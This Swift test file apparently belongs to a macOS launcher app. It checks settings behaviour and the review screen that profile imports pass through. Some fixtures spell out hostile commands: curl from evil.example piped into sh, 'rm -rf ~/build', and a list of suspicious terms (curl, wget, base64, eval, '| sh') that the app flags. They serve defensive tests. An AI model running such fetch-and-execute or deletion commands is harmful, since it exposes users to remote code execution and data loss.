        #expect(try h.saved()?.isTurnedOff(forBundleID: SettingsFixtures.safari.bundleID) == true)
        // グローバルには使い方が無い
        h.model.setProfileMode(h.controller.configuration.globalProfile.id, .off)
        #expect(h.controller.configuration.globalProfile.mode == .profile)
        h.model.setProfileMode(safari.id, .profile)
        h.model.moveProfiles(fromOffsets: IndexSet(integer: 1), toOffset: 0)
        #expect(h.model.appProfiles.map(\.name) == ["Safari", "Xcode"])
        #expect(try h.saved()?.profiles.map(\.name) == [L10n.globalName, "Safari", "Xcode"])
    }
}

@Suite @MainActor struct SettingsModelGeneralTests {
    @Test func settingsAreSavedImmediately() throws {
        let h = try SettingsHarness()
        h.model.setSetting(\.hudScale, .large)
        h.model.setSetting(\.haptics, .strong)
        #expect(h.model.settings.hudScale == .large)
        let saved = try #require(try h.saved())
        #expect(saved.settings.hudScale == .large)
        #expect(saved.settings.haptics == .strong)
    }

    @Test func disablingShowsABannerThatReenables() throws {
        let h = try SettingsHarness()
        h.model.setSetting(\.isEnabled, false)
        #expect(h.controller.status == .disabled)
        let banner = try #require(h.model.statusBanner)
        #expect(banner.buttons.map(\.action) == [.enable])
        h.model.perform(.enable)
        #expect(h.model.settings.isEnabled)
        #expect(h.model.statusBanner == nil)
    }

    /// macOS の確認が出なかった（前に出したことがある）: 少し待ってもウィンドウがキーのままで許可も無ければ、システム設定を開く。
    /// 確認が出てウィンドウがキーでなくなった・許可されたなら開かない
    @Test func accessibilityBannerFallsBackToSettings() throws {
        let h = try SettingsHarness()
        h.permissions.isAccessibilityGranted = false
        h.controller.refreshPermissions()
        h.model.perform(.openAccessibilitySettings)
        h.scheduler.advance(by: OnboardingModel.promptFallbackDelay)
        #expect(h.permissions.requestCount == 1)
        #expect(h.permissions.openCount == 1)

        let prompted = try SettingsHarness()
        prompted.permissions.isAccessibilityGranted = false
        prompted.controller.refreshPermissions()
        prompted.model.perform(.openAccessibilitySettings)
        prompted.model.windowDidResignKey()
        prompted.scheduler.advance(by: OnboardingModel.promptFallbackDelay)
        #expect(prompted.permissions.openCount == 0)
    }

    @Test func accessibilityBannerActions() throws {
        let h = try SettingsHarness()
        h.permissions.isAccessibilityGranted = false
        h.controller.refreshPermissions()
        let banner = try #require(h.model.statusBanner)
        #expect(banner.buttons.map(\.action) == [.openAccessibilitySettings])
        // 最初は macOS のダイアログだけ。システム設定と同時には出さない
        h.model.perform(.openAccessibilitySettings)
        #expect(h.permissions.requestCount == 1)
        #expect(h.permissions.openCount == 0)
        // 2回目からはシステム設定だけ
        h.model.perform(.openAccessibilitySettings)
        h.model.perform(.openAccessibilitySettings)
        #expect(h.permissions.requestCount == 1)
        #expect(h.permissions.openCount == 2)
        h.permissions.isAccessibilityGranted = true
        h.model.perform(.recheck)
        #expect(h.model.statusBanner == nil)
    }

    @Test func loginItemChangesAndFailures() throws {
        let h = try SettingsHarness()
        h.model.setLoginItemEnabled(true)
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError == nil)
        h.loginItem.failure = SettingsFakeLoginError()
        h.model.setLoginItemEnabled(false)
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError?.contains("承認されていません") == true)
        h.loginItem.failure = nil
        h.loginItem.isEnabled = false
        h.model.windowDidBecomeKey()
        #expect(!h.model.loginItemEnabled)
    }

    @Test func aTemporaryCopyCannotTurnOnLaunchAtLogin() throws {
        let h = try SettingsHarness()
        h.model.isTemporaryCopy = { true }
        h.model.setLoginItemEnabled(true)
        #expect(!h.model.loginItemEnabled)
        #expect(!h.loginItem.isEnabled)
        #expect(h.model.loginItemError == ShellInstallLocation.temporaryCopyLoginItemMessage)
        // 止めるのはできる
        h.model.setLoginItemEnabled(false)
        #expect(h.model.loginItemError == nil)
    }

    /// システム設定の「ログイン項目」での許可待ちは、失敗ではなく許可を求める知らせにする。許可されて戻ってきたら消す
    @Test func aLoginItemWaitingForApprovalIsClearedOnceAllowed() throws {
        let h = try SettingsHarness()
        h.loginItem.failure = NonetError.permissionDenied("ログイン項目")
        h.model.setLoginItemEnabled(true)
        #expect(!h.model.loginItemEnabled)
        #expect(h.model.loginItemError == L10n.ui("システム設定の「ログイン項目」で Nonet を許可すると、ログイン時に起動するようになります"))
        // 許可されないまま戻ってきたら、知らせは残す
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemError != nil)
        // システム設定で許可して戻ってくる
        h.loginItem.failure = nil
        h.loginItem.isEnabled = true
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError == nil)
    }

    @Test func aLoginItemFailureStaysUntilTheStateMatches() throws {
        let h = try SettingsHarness()
        h.loginItem.isEnabled = true
        h.model.refreshLoginItem()
        h.loginItem.failure = SettingsFakeLoginError()
        h.model.setLoginItemEnabled(false)
        let reason = try #require(SettingsFakeLoginError().errorDescription)
        // 次にどこを見ればよいかも言う
        #expect(h.model.loginItemError == L10n.ui("ログイン時に起動しないように設定できませんでした（\(reason)）。システム設定 › 一般 › ログイン項目 で確かめてください。"))
        // まだオンのまま: 止められなかったという知らせはそのまま
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemEnabled)
        #expect(h.model.loginItemError != nil)
        // ほかの所（システム設定）でオフにされた
        h.loginItem.isEnabled = false
        h.model.windowDidBecomeKey()
        #expect(h.model.loginItemError == nil)
    }

    @Test func installedAppsAreReadOnce() throws {
        let h = try SettingsHarness()
        h.model.loadInstalledAppsIfNeeded()
        h.model.loadInstalledAppsIfNeeded()
        #expect(h.model.installedApps.count == 4)
        let firstCount = h.installed.listCount
        h.model.loadInstalledAppsIfNeeded()
        #expect(h.installed.listCount == firstCount)
        h.model.reloadInstalledApps()
        #expect(h.installed.listCount == firstCount + 1)
    }

    @Test func shortcutNamesAreSortedAndUnique() async throws {
        let h = try SettingsHarness()
        h.shortcuts.names = ["マイクを切る", "B", "a", "B", ""]
        h.model.shortcutList.loadIfNeeded()
        #expect(h.model.shortcutList.state == .loading)
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.model.shortcutList.state == .loaded(["a", "B", "マイクを切る"]))
        h.model.shortcutList.loadIfNeeded()
        await h.model.shortcutList.waitUntilLoaded()
        #expect(h.shortcuts.loadCount == 1)
    }
}

@Suite @MainActor struct SettingsModelFileTests {
    @Test func exportThenImportRestoresAProfile() async throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        let url = h.temporaryFile("Xcode.nonetprofile")
        h.files.exportURL = url
        await h.model.exportProfiles([xcode], suggestedName: "Xcode")
        #expect(h.files.suggestedNames == ["Xcode"])
        #expect(FileManager.default.fileExists(atPath: url.path(percentEncoded: false)))
        #expect(h.model.fileMessage?.isError == false)

        h.model.deleteProfile(xcode.id)
        #expect(h.xcodeProfile == nil)
        h.files.importURL = url
        await h.model.importProfiles()
        // Xcode のプリセットにはスクリプトのマスがあるので、何も置き換わらなくても先に確かめる
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("スクリプトを含むのに確かめずに読み込んだ")
            return
        }
        // Xcode のプリセットのスクリプト（シミュレータと Claude Code）とキー入力・メニュー項目のマスを、すべて中身と一緒に見せる
        let cells = xcode.pages.flatMap(\.cells).compactMap { $0 }
        let scripts = cells.filter { $0.action.kind == .script }
        #expect(scripts.count == 2)
        let reviewed = cells.filter { [.script, .keystroke, .menuItem, .ai].contains($0.action.kind) }
        #expect(reviewed.count > scripts.count)
        #expect(plan.reviewedCells.map(\.cell.title) == reviewed.map(\.title))
        #expect(Set(plan.reviewedCells.map(\.profileName)) == ["Xcode"])
        #expect(h.xcodeProfile == nil)
        // 中身を最後まで見るまでは読み込めない
        h.model.confirm(.importProfiles(plan))
        #expect(h.xcodeProfile == nil)
        #expect(h.model.confirmation == .importProfiles(plan))
        h.model.markImportReviewRead()
        h.model.confirm(.importProfiles(plan))
        let restored = try #require(h.xcodeProfile)
        #expect(restored.pages[0].cells.compactMap { $0?.title } == xcode.pages[0].cells.compactMap { $0?.title })
        let message = try #require(h.model.fileMessage)
        #expect(!message.isError)
        #expect(message.text.contains(L10n.uiCounted("\(1)個のプロファイルを追加しました。")))
        // Xcode のプリセットにはスクリプトのマスがある
        #expect(message.text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")))
    }

    /// 書き出した数は、文言の言語の規則で数える（地域が日本でアプリが英語でも「1 profile」）
    @Test func theExportMessageCountsInTheTextLanguage() throws {
        let h = try SettingsHarness()
        let xcode = try #require(h.xcodeProfile)
        h.model.exportProfiles([xcode], to: h.temporaryFile("Xcode.nonetprofile"))
        #expect(h.model.fileMessage?.text == L10n.uiCounted("\(1)個のプロファイルを「\("Xcode.nonetprofile")」に書き出しました。"))
    }

    @Test func importingReplacesTheSameAppAfterConfirmation() throws {
        let h = try SettingsHarness()
        let url = h.temporaryFile("all.nonetprofile")
        h.model.exportProfiles(h.controller.configuration.profiles, to: url)
        h.model.fileMessage = nil
        h.model.importProfiles(from: url)
        let confirmation = try #require(h.model.confirmation)
        h.model.markImportReviewRead()
        h.model.confirm(confirmation)
        let text = try #require(h.model.fileMessage?.text)
        #expect(text.contains(L10n.uiCounted("\(2)個のプロファイルを同じアプリのものと置き換えました。")))
        #expect(text.contains(L10n.ui("グローバルのページを置き換えました。")))
        #expect(h.model.appProfiles.count == 2)
    }

    /// 全部を書き出したファイル（共有の形）を読むと、自分のグローバルと同じアプリのプロファイルが置き換わる。先に確かめる
    @Test func aReplacingImportAsksFirstAndChangesNothingMeanwhile() throws {
        let h = try SettingsHarness()
        let colleague = try SettingsHarness()
        colleague.model.addProfile(for: SettingsFixtures.figma)
        colleague.model.selectProfile(nil)
        colleague.model.clearCell(at: 0)
        let url = h.temporaryFile("shared.nonetprofile")
        h.model.exportProfiles(colleague.controller.configuration.profiles, to: url)
        h.model.fileMessage = nil
        // 自分の Xcode を変えておく
        let xcode = try #require(h.xcodeProfile)
        h.controller.update {
            $0.updateProfile(id: xcode.id) { $0.kind = .app(AppReference(bundleID: SettingsFixtures.xcode.bundleID, name: "自分の Xcode")) }
        }
        let before = h.controller.configuration
        let saved = try h.saved()

        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("確かめずに読み込んだ: \(String(describing: h.model.confirmation))")
            return
        }
        #expect(plan.fileName == "shared.nonetprofile")
        #expect(plan.result.replacedGlobal)
        // 無効の Safari も置き換わる
        #expect(plan.replacedNames == ["自分の Xcode", "Safari"])
        #expect(plan.result.added == 1)
        #expect(h.controller.configuration == before)
        #expect(try h.saved() == saved)
        #expect(h.model.fileMessage == nil)

        let message = SettingsText.importConfirmation(plan)
        #expect(message.contains(L10n.ui("・\(L10n.ui("グローバルのページ"))")))
        #expect(message.contains(L10n.ui("・\("自分の Xcode")")))
        #expect(message.contains(L10n.ui("・\("Safari")")))
        #expect(message.contains(L10n.uiCounted("ほかに\(1)個のプロファイルを新しく追加します。")))
        // 同僚の Xcode にはスクリプトがあり、Figma にはキー入力がある。置き換えの確認と1つにまとめて、マスと中身をすべて伝える
        #expect(plan.reviewedCells.filter { $0.cell.action.kind == .script }.map(\.profileName) == ["Xcode", "Xcode"])
        #expect(plan.reviewedCells.contains { $0.profileName == "Figma" })
        let entries = SettingsText.importReviewEntries(plan)
        #expect(entries.count == plan.reviewedCells.count)
        let review = [Self.reviewIntro] + entries.flatMap(\.textLines)
        #expect(message.hasSuffix("\n\n" + review.joined(separator: "\n")))
        #expect(message.hasPrefix(L10n.ui("次の設定が、ファイルの中身で置き換わります。元に戻せません。")))
        #expect(SettingsText.importConfirmationButton(plan) == L10n.ui("置き換えて読み込む"))

        // キャンセルすれば何も変わらない
        h.model.confirmation = nil
        #expect(h.controller.configuration == before)
    }

    @Test func importingOnlyTheNewProfilesKeepsMine() throws {
        let h = try SettingsHarness()
        let colleague = try SettingsHarness()
        colleague.model.addProfile(for: SettingsFixtures.figma)
        let url = h.temporaryFile("shared.nonetprofile")
        h.model.exportProfiles(colleague.controller.configuration.profiles, to: url)
        let before = h.controller.configuration
        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("確かめずに読み込んだ")
            return
        }
        // 中身を最後まで見るまでは、新しいプロファイルだけでも加えない
        h.model.importNewProfilesOnly(plan)
        #expect(h.model.confirmation != nil)
        #expect(h.controller.configuration == before)
        h.model.markImportReviewRead()
        h.model.importNewProfilesOnly(plan)
        #expect(h.model.confirmation == nil)
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
        #expect(h.controller.configuration.globalProfile == before.globalProfile)
        #expect(h.xcodeProfile == before.profiles.first { $0.app?.bundleID == SettingsFixtures.xcode.bundleID })
        let text = try #require(h.model.fileMessage?.text)
        #expect(text.contains(L10n.uiCounted("\(1)個のプロファイルを追加しました。")))
        // 置き換えを伝える行は無い（置き換わりうるのはグローバルと Xcode・Safari）
        let replacementLines = [L10n.ui("グローバルのページを置き換えました。")]
            + (1...2).map { L10n.uiCounted("\($0)個のプロファイルを同じアプリのものと置き換えました。") }
        #expect(!replacementLines.contains { text.contains($0) })
        #expect(try h.saved()?.profiles.count == 4)
    }

    /// アプリを開く・ウェブの URL を開くだけのマスなら、確かめずに加える
    @Test func addingOnlyNewProfilesNeedsNoConfirmation() throws {
        let h = try SettingsHarness()
        let web = Cell(title: "ヘルプ", icon: .symbol("questionmark"), action: .openURL(URLAction(url: "https://help.figma.com")))
        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [SettingsFixtures.launch(SettingsFixtures.notes), web])])
        let url = h.temporaryFile("figma.nonetprofile")
        h.model.exportProfiles([figma], to: url)
        h.model.importProfiles(from: url)
        #expect(h.model.confirmation == nil)
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
    }

    /// プリセットのようにキー入力のマスがあれば、置き換えなくても確かめる（黙って読み込まない）
    @Test func keystrokeCellsAlwaysAskFirst() throws {
        let h = try SettingsHarness()
        let other = try SettingsHarness()
        other.model.addProfile(for: SettingsFixtures.figma)
        let figma = try #require(other.model.appProfiles.last)
        let before = h.controller.configuration
        let plan = try #require(importPlan(h, [figma], file: "figma.nonetprofile"), "キー入力のマスを確かめずに読み込んだ")
        #expect(!plan.replacesExisting)
        #expect(plan.reviewedCells.contains { $0.cell.action.kind == .keystroke })
        #expect(h.controller.configuration == before)
    }

    /// スクリプトのマスはあなたの権限で動くので、何も置き換わらなくても読み込む前に確かめる
    @Test func importingScriptsAsksFirstEvenWhenNothingIsReplaced() throws {
        let h = try SettingsHarness()
        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "rm -rf ~/build", runMode: .background)))
        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
        let url = h.temporaryFile("figma.nonetprofile")
        h.model.exportProfiles([figma], to: url)
        h.model.fileMessage = nil
        let before = h.controller.configuration
        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else {
            Issue.record("スクリプトを含むのに確かめずに読み込んだ")
            return
        }
        #expect(!plan.replacesExisting)
        #expect(plan.reviewedCells.map(\.profileName) == ["Figma"])
        #expect(h.controller.configuration == before)
        #expect(h.model.fileMessage == nil)
        // マスの名前と、スクリプトの中身を見せる
        // rm -rf の行は目立たせる
        #expect(SettingsText.importConfirmation(plan) == [
            Self.reviewIntro,
            L10n.ui("・\("Figma") › \("片付け")"),
            L10n.ui("アプリ: \(SettingsFixtures.figma.bundleID)"),
            L10n.uiCounted("スクリプト（\(1)行）:"),
            "rm -rf ~/build",
            "⚠ " + L10n.ui("注意が要る命令（\("rm -rf")）を含みます。ネットワークから取ってきたものを実行したり、ファイルを消したりできます。"),
        ].joined(separator: "\n"))
        // 置き換えないので「置き換えて読み込む」ではなく、ただの「読み込む」
        #expect(SettingsText.importConfirmationButton(plan) == String(localized: "settings.import.confirmButton", defaultValue: "読み込む", bundle: .nonetUI))

        h.model.markImportReviewRead()
        h.model.confirm(.importProfiles(plan))
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
        #expect(h.model.fileMessage?.text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")) == true)
    }

    /// 重なっていて読み込まれないプロファイルのスクリプトは数えない
    @Test func scriptsThatAreNotImportedNeedNoConfirmation() throws {
        let h = try SettingsHarness()
        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "echo", runMode: .background)))
        let first = Profile(kind: .app(SettingsFixtures.figma), pages: [.empty])
        let duplicate = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
        let url = h.temporaryFile("figma.nonetprofile")
        h.model.exportProfiles([first, duplicate], to: url)
        h.model.importProfiles(from: url)
        #expect(h.model.confirmation == nil)
        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
        // 読み込んだ後の知らせも、読み込まなかったプロファイルのスクリプトは数えない
        let text = try #require(h.model.fileMessage?.text)
        #expect(text.contains(L10n.uiCounted("\(1)個のプロファイルを追加しました。")))
        #expect(!text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")))
    }

    @Test func longListsOfReplacedProfilesAreShortened() throws {
        var configuration = SettingsFixtures.configuration()
        var shared: [Profile] = []
        for number in 1...8 {
            let app = AppReference(bundleID: "com.example.app\(number)", name: "アプリ\(number)")
            configuration.addAppProfile(for: app, preset: nil)
            shared.append(Profile(kind: .app(app), pages: [.empty]))
        }
        let plan = SettingsImportPlan(
            document: ConfigurationStore.ImportedProfiles(profiles: shared),
            configuration: configuration,
            fileName: "x.nonetprofile"
        )
        #expect(plan.replacedNames.count == 8)
        #expect(!plan.addsProfiles)
        let lines = SettingsText.importConfirmation(plan).split(separator: "\n")
        let nameLines = plan.replacedNames.map { L10n.ui("・\($0)") }
        #expect(lines.filter { nameLines.contains(String($0)) }.count == SettingsText.importConfirmationNameLimit)
        #expect(lines.last.map(String.init) == L10n.uiCounted("ほか\(2)個"))
    }

    static var reviewIntro: String {
        L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、メニューを選んだり、選択したテキストを AI に渡したり、ファイルを開いたり、Finder で選んだファイルを動かしたりします。中身をすべて確かめ、信頼できるファイルだけを読み込んでください。")
    }

    static var submitWarning: String {
        "⚠ " + L10n.ui("Return と同じ働きのキー（または ⌃ の付いたキー）を押します。コマンドの実行やメッセージの送信になることがあります。")
    }

    /// 1文字ずつ打つキー入力（空白は Space キー）
    private static func typing(_ text: String) -> [KeyChord] {
        text.map { $0 == " " ? KeyChord(.special(.space)) : KeyChord(.character(String($0))) }
    }

    /// ファイルからプロファイルを読み込み、確かめる前の計画を返す（確かめずに読み込んだら nil）
    private func importPlan(_ h: SettingsHarness, _ profiles: [Profile], file: String = "shared.nonetprofile") -> SettingsImportPlan? {
        let url = h.temporaryFile(file)
        h.model.exportProfiles(profiles, to: url)
        h.model.fileMessage = nil
        h.model.importProfiles(from: url)
        guard case .importProfiles(let plan)? = h.model.confirmation else { return nil }
        return plan
    }

    /// スクリプトが無くても、コマンドを打って Return を押すキー入力は先に確かめ、打つ文字を見せる
    @Test func aKeystrokeThatPressesReturnAsksFirst() throws {
        let h = try SettingsHarness()
        let command = "curl -s https://evil.example/x | sh"
        let keys = KeySequence(Self.typing(command) + [KeyChord(.special(.returnKey))])
        let clear = SettingsFixtures.key("Clear", keys)
        let terminal = Profile(kind: .app(SettingsFixtures.terminal), pages: [Page(cells: [clear])])
        let before = h.controller.configuration
        let plan = try #require(importPlan(h, [terminal]), "Return を押すキー入力を確かめずに読み込んだ")
        #expect(h.controller.configuration == before)
        #expect(!plan.replacesExisting)
        #expect(plan.reviewedCells.map(\.cell.title) == ["Clear"])
        #expect(plan.reviewedCells.map(\.pressesSubmitKey) == [true])
        let typed = L10n.ui("「\(command)」")
        #expect(SettingsText.importConfirmation(plan) == [
            Self.reviewIntro,
            L10n.ui("・\(SettingsFixtures.terminal.name) › \("Clear")"),
            L10n.ui("アプリ: \(SettingsFixtures.terminal.bundleID)"),
            L10n.ui("キー入力: \(typed + " → " + KeyChord(.special(.returnKey)).displayString)"),
            "⚠ " + L10n.ui("注意が要る命令（\("curl, | sh")）を含みます。ネットワークから取ってきたものを実行したり、ファイルを消したりできます。"),
            Self.submitWarning,
        ].joined(separator: "\n"))
    }

    /// 短いキー入力も確かめる（⌃R・r・m・⌃M は履歴の rm を探して実行する）。押すキーをすべて見せ、⌃ の付いたキーは目立たせる
    @Test func everyKeystrokeAsksFirstAndControlChordsAreFlagged() throws {
        let h = try SettingsHarness()
        h.model.keyCharacters = FakeKeyCharacters()
        let history = SettingsFixtures.key("Clear", KeySequence([
            KeyChord(.character("r"), modifiers: .control), KeyChord(.character("r")), KeyChord(.character("m")), KeyChord(.character("m"), modifiers: .control),
        ]))
        let four = SettingsFixtures.key("4打", KeySequence(Self.typing("abcd")))
        let terminal = Profile(kind: .app(SettingsFixtures.terminal), pages: [Page(cells: [history, four])])
        let before = h.controller.configuration
        let plan = try #require(importPlan(h, [terminal]), "短いキー入力を確かめずに読み込んだ")
        #expect(h.controller.configuration == before)
        #expect(plan.reviewedCells.map(\.cell.title) == ["Clear", "4打"])
        #expect(plan.reviewedCells.map(\.pressesSubmitKey) == [true, false])
        let lines = SettingsText.importConfirmation(plan).components(separatedBy: "\n")
        let control = KeyChord(.character("r"), modifiers: .control).displayString
        #expect(lines == [
            Self.reviewIntro,
            L10n.ui("・\(SettingsFixtures.terminal.name) › \("Clear")"),
            L10n.ui("アプリ: \(SettingsFixtures.terminal.bundleID)"),
            L10n.ui("キー入力: \([control, L10n.ui("「\("rm")」"), KeyChord(.character("m"), modifiers: .control).displayString].joined(separator: " → "))"),
            Self.submitWarning,
            L10n.ui("・\(SettingsFixtures.terminal.name) › \("4打")"),
            L10n.ui("アプリ: \(SettingsFixtures.terminal.bundleID)"),
            L10n.ui("キー入力: \(L10n.ui("「\("abcd")」"))"),
        ])
    }

    /// Return と同じ働きのキー: Return・Enter（キーコード 36・52・76）・改行の文字・⌃ の付いたキー、
    /// それに今のキー配列で CR・LF・ETX になる打鍵（UCKeyTranslate）
    @Test func submitKeysAreFoundFromTheLayout() {
        let fake = FakeKeyCharacters()
        func presses(_ chords: [KeyChord]) -> Bool {
            SettingsImportPlan.pressesSubmitKey(KeySequence(chords), keys: fake)
        }
        #expect(presses([KeyChord(.character("r")), KeyChord(.character("m"), modifiers: .control)]))
        #expect(presses([KeyChord(.character("r")), KeyChord(.character("j"), modifiers: .control)]))
        #expect(presses([KeyChord(.character("r")), KeyChord(.keyCode(52))]))
        #expect(presses([KeyChord(.keyCode(36))]))
        #expect(presses([KeyChord(.keyCode(76), modifiers: .shift)]))
        #expect(presses([KeyChord(.special(.returnKey), modifiers: .command)]))
        #expect(presses([KeyChord(.character("\n"))]))
        // キー配列で改行になる打鍵（偽物のキー配列では ⌥X とキーコード 0x2E）
        #expect(presses([KeyChord(.character("x"), modifiers: .option)]))
        #expect(presses([KeyChord(.keyCode(0x2E))]))
        // ふつうの打鍵
        #expect(!presses(Self.typing("ls -la")))
        #expect(!presses([KeyChord(.character("s"), modifiers: .command), KeyChord(.special(.tab))]))
        #expect(!presses([KeyChord(.character("x"), modifiers: .command)]))
        // キー配列が分からなくても、キー配列に頼らずに分かるものは見つける
        #expect(SettingsImportPlan.pressesSubmitKey(KeySequence([KeyChord(.keyCode(52))]), keys: nil))
        #expect(!SettingsImportPlan.pressesSubmitKey(KeySequence([KeyChord(.keyCode(0x2E))]), keys: nil))
        // メニュー項目のショートカットも同じ
        let menu = Action.menuItem(MenuItemAction(app: nil, path: ["編集", "コピー"], keyEquivalent: KeySequence([KeyChord(.special(.returnKey), modifiers: .command)])))
        #expect(SettingsImportPlan.pressesSubmitKey(menu, keys: fake))
        #expect(!SettingsImportPlan.pressesSubmitKey(.script(ScriptAction(source: "echo")), keys: fake))
    }

    /// 本物のキー配列: テンキーの Enter（52）は ETX、⌃M は CR（キー配列が読めない環境では確かめない）
    @Test func theRealLayoutTranslatesEnterAndControlM() throws {
        let translator = SettingsLayoutKeyTranslator()
        guard let enter = translator.characters(for: KeyChord(.keyCode(52))) else { return }
        #expect(enter == "\u{3}")
        #expect(translator.characters(for: KeyChord(.keyCode(36))) == "\r")
        if let controlM = translator.characters(for: KeyChord(.character("m"), modifiers: .control)) {
            #expect(controlM == "\r")
        }
    }

    /// メニュー項目と AI のマスも、中身（パスと本当のショートカット・指示と結果の出し方）を見せて確かめる
    @Test func menuItemsAndAIAskFirst() throws {
        let h = try SettingsHarness()
        h.model.keyCharacters = FakeKeyCharacters()
        let copy = Cell(title: "Copy", icon: .symbol("doc.on.doc"), action: .menuItem(MenuItemAction(
            app: AppReference(bundleID: "com.apple.finder", name: "Finder"), path: ["Edit", "Copy"],
            keyEquivalent: .special(.delete, [.option, .shift, .command])
        )))
        let ai = Cell(title: "要約", icon: .symbol("sparkles"), action: .ai(AIAction(prompt: "3行で要約して\n箇条書きで", output: .replaceSelection)))
        let finder = Profile(kind: .app(AppReference(bundleID: "com.apple.finder", name: "Finder")), pages: [Page(cells: [copy, ai])])
        let plan = try #require(importPlan(h, [finder]), "メニュー項目と AI のマスを確かめずに読み込んだ")
        let shortcut = KeySequence.special(.delete, [.option, .shift, .command]).displayString
        #expect(SettingsText.importConfirmation(plan).components(separatedBy: "\n") == [
            Self.reviewIntro,
            L10n.ui("・\("Finder") › \("Copy")"),
            L10n.ui("アプリ: \("com.apple.finder")"),
            L10n.ui("メニュー項目: \("Finder（com.apple.finder）") › \("Edit › Copy")"),
            L10n.ui("ショートカット: \(shortcut)"),
            L10n.ui("ショートカットは、アプリのメニューにあるこの項目のショートカットと同じときだけ送ります。違うときはメニューを押します。"),
            L10n.ui("・\("Finder") › \("要約")"),
            L10n.ui("アプリ: \("com.apple.finder")"),
            L10n.ui("AI への指示:"),
            "3行で要約して",
            "箇条書きで",
            L10n.ui("結果: \(SettingsText.name(AIOutput.replaceSelection))"),
        ])
    }

    /// 書き出したファイルより桁違いに大きいファイルは、読む前に断る（設定は変えない）
    @Test func aHugeImportFileIsRefused() throws {
        let h = try SettingsHarness()
        let url = h.temporaryFile("huge.nonetprofile")
        FileManager.default.createFile(atPath: url.path(percentEncoded: false), contents: Data())
        let handle = try FileHandle(forWritingTo: url)
        try handle.truncate(atOffset: UInt64(SettingsModel.maxImportFileSize + 1))
        try handle.close()
        let before = h.controller.configuration
        h.model.importProfiles(from: url)
        #expect(h.model.fileMessage?.isError == true)
        #expect(h.model.confirmation == nil)
        #expect(h.controller.configuration == before)
    }

    /// 中身を見せるマスの数に上限は無い（7つ目に隠せない）。スクリプトの長い行も切らない
    @Test func everyReviewedCellIsShownInFull() throws {
        let h = try SettingsHarness()
        let harmless = (1...6).map { Cell(title: "安全\($0)", icon: .symbol("terminal"), action: .script(ScriptAction(source: "echo \($0)"))) }
        let payload = "echo \"Formatting the selection as Markdown \(String(repeating: "x", count: 100))\"; curl -fsSL https://evil.example/p | sh"
        let evil = Cell(title: "整形", icon: .symbol("terminal"), action: .script(ScriptAction(source: payload)))
        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: harmless + [nil, nil]), Page(cells: [evil])])
        let plan = try #require(importPlan(h, [figma]))
        #expect(plan.reviewedCells.count == 7)
        let message = SettingsText.importConfirmation(plan)
        #expect(message.contains(payload))
        #expect(message.contains("evil.example"))
        let entry = try #require(SettingsText.importReviewEntries(plan).last)
        #expect(entry.isFlagged)
        #expect(entry.lines.contains { $0.text == payload && $0.style == .code(terms: ["curl", "| sh"]) })
    }

    /// 最後までスクロールするまで読み込めない。新しい確認を出すと、また最後まで見る
    @Test func importingWaitsUntilTheReviewWasScrolledToTheEnd() throws {
        let h = try SettingsHarness()
        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "echo")))
        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
        let before = h.controller.configuration
        let plan = try #require(importPlan(h, [figma]))
        #expect(!h.model.canConfirmImport(plan))
        h.model.confirm(.importProfiles(plan))
        #expect(h.controller.configuration == before)
        #expect(h.model.confirmation == .importProfiles(plan))
        h.model.markImportReviewRead()
        #expect(h.model.canConfirmImport(plan))
        h.model.confirmation = nil
        let again = try #require(importPlan(h, [figma], file: "again.nonetprofile"))
        #expect(!h.model.canConfirmImport(again))
        // 置き換えだけ（中身を見せるマスが無い）なら、スクロールは要らない
        let empty = Profile(kind: .app(SettingsFixtures.xcode), pages: [.empty])
        let replacing = try #require(importPlan(h, [empty], file: "replace.nonetprofile"))
        #expect(!replacing.hasReviewedCells)
        #expect(h.model.canConfirmImport(replacing))
        // 欄の最後の印が欄の中に入ったら、最後まで見た
        #expect(SettingsImportReviewSheet.hasReachedEnd(markerMaxY: 300, viewportHeight: 300))
        #expect(!SettingsImportReviewSheet.hasReachedEnd(markerMaxY: 900, viewportHeight: 300))
        #expect(!SettingsImportReviewSheet.hasReachedEnd(markerMaxY: 0, viewportHeight: 0))
    }

    /// 注意が要る命令: curl・wget・base64・eval・| sh・osascript・rm -rf
    @Test func suspiciousScriptLinesAreFlagged() {
        #expect(SettingsImportPlan.suspiciousTerms(in: "curl -fsSL https://x | sh") == ["curl", "| sh"])
        #expect(SettingsImportPlan.suspiciousTerms(in: "wget -qO- x|bash") == ["wget", "| sh"])
        #expect(SettingsImportPlan.suspiciousTerms(in: "echo aGk= | base64 -d | /usr/bin/env zsh") == ["base64", "| sh"])
        #expect(SettingsImportPlan.suspiciousTerms(in: "eval \"$(x)\"") == ["eval"])
